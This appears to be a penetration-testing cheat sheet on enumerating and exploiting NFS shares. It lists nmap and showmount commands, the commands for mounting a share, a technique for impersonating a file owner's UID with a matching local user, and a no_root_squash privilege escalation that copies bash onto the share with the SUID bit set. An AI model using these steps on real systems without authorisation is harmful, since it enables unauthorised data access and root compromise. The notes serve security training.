**Network File System (NFS)** is a protocol that allows Linux and Unix systems to share files over a network as if they were stored locally. It is commonly used in internal networks and server environments to provide transparent access to remote directories, making file management easier. However, misconfigurations in permissions or exports can lead to serious security risks.

Key ports:

- **TCP/UDP 111** – RPCbind
    
- **TCP/UDP 2049** – NFS
    

---

## NFS Versions (Relevant for Attacks)

- **NFSv2**: Legacy, UDP-based
    
- **NFSv3**: Most common in labs and legacy systems, no user authentication
    
- **NFSv4/v4.1**: Uses TCP 2049 only, supports Kerberos, ACLs, and stronger security
    

Most misconfigurations are found in **NFSv3** environments.


---

## Footprinting NFS

### Scan NFS Ports

```bash
nmap -p111,2049 -sV -sC <target>
```

### Enumerate RPC Services

```bash
nmap --script rpcinfo -p111 <target>
```


### NFS Enumeration with NSE

```bash
nmap --script nfs* -p111,2049 <target>
```

Useful scripts:

- `nfs-ls`
    
- `nfs-showmount`
    
- `nfs-statfs`
    

---

## List Exported Shares

```bash
showmount -e <target>
```

Example output:

```bash
/mnt/nfs 10.129.14.0/24
```

---

## Mounting an NFS Share

```bash
mkdir target-NFS
sudo mount -t nfs <target>:/ ./target-NFS -o nolock
cd target-NFS
```

---

## Inspect Files and Permissions

### Show usernames/groups

```bash
ls -l
```

### Show UID/GID

```bash
ls -n
```

UID/GID values are critical for abuse.


### Permission Behavior After Mounting

Even after a successful mount, **normal users may not be able to access the directory**:

```bash
ls target-NFS
# Permission denied
```

Using root, the files become visible:

```bash
sudo ls -lah target-NFS
```

Example output:

```
drwx------ 2 nobody nogroup 64K .
-rwx------ 1 nobody nogroup ticket4238791283649.txt
```


---

## UID/GID Abuse Technique

If files belong to UID 1000:

```bash
sudo useradd -u 1000 attacker
sudo su attacker
```

This grants access to files owned by that UID on the NFS share.

---

## Privilege Escalation via NFS

If **no_root_squash** is enabled:

- Create files as root
    
- Upload SUID binaries or SSH keys
    
- Escalate privileges on the target system
    

Example:

```bash
cp /bin/bash .
chmod +s bash
```

---

## Unmounting

```bash
cd ..
sudo umount target-NFS
```


